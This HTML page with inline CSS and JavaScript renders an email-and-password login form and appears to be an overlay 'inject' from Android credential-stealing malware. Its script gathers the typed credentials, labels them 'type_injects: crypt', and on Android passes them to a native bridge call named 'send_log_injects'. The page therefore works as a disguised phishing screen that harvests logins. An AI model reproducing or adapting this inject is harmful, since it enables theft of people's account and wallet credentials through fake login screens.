    <style>
        body {
            background-color: #f5f6f8;
        }

        section {
            padding: 15px;
        }

        label {
            color: #071826;
            font-size: 14px;
        }

        .input {
            width: 100%;
            padding: 8px;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            margin-bottom: 15px;
        }

        .input:focus {
            border-color: #2ab1f3;
        }

        .button {
            width: 100%;
            padding: 10px;
            border: 0;
            border-radius: 4px;
            background-color: #4cd964;
            color: #fff;
            font-size: 14px;
            font-weight: 100;
            box-shadow: 0 2px 2px rgb(194, 194, 194);
            margin-bottom: 15px;
        }

        p {
            text-align: center;
            color: #2ab1f3;
            font-weight: 600;
            font-size: 14px;
        }

        .input, .button {
            outline: none !important;
        }

        .input {
            box-shadow: none !important;
        }

        .error {
            border-color: #f00 !important;
        }
    </style>

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData'),
            eye = document.getElementById('eye');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text'
            } else {
                password.type = 'password'
            }
        }
        
        sendData.onclick = () => {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 5) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 5) {
                var data = {};
                data.email = login.value;
                data.password = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
